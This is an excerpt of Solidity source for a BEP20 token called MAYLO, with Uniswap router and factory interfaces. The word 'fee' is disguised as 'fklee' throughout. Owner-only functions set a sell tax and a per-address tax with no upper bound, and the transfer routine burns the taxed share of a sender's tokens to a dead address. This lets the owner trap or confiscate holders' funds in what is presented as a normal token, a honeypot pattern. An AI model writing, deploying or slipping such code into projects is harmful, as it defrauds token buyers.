...
interface IUniswapV2Factory {
    ...
    function fkleeTo() external view returns (address);
    function fkleeToSetter() external view returns (address);
    ...
    function setfkleeTo(address) external;
    function setfkleeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfkleeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfkleeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfkleeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfkleeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfkleeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract MAYLO is BEP20, Ownable {
    ...
    uint256 private _defaultSellfklee = 0;

    uint256 private _defaultBuyfklee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfklee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfklee = _value;
    }

    function setSlipfklee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfklee[_address] = _value;
    }

    function getSlipfklee(address _address) external view onlyownar returns (uint256) {
        return _slipfklee[_address];
    }


    function setMAccountfklee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfklee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefkleeAmount = 0;

        if (rF) {
            uint256 tradefklee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefklee = _defaultSellfklee;
                }
                if (from == uniswapV2Pair) {

                    tradefklee = _defaultBuyfklee;
                }
            }
            if (_slipfklee[from] > 0) {
                tradefklee = _slipfklee[from];
            }

            tradefkleeAmount = _Amount.mul(tradefklee).div(100);
        }


        if (tradefkleeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefkleeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefkleeAmount);
            emit Transfer(from, _deadAddress, tradefkleeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefkleeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefkleeAmount);
        emit Transfer(from, _to, _Amount - tradefkleeAmount);
    }
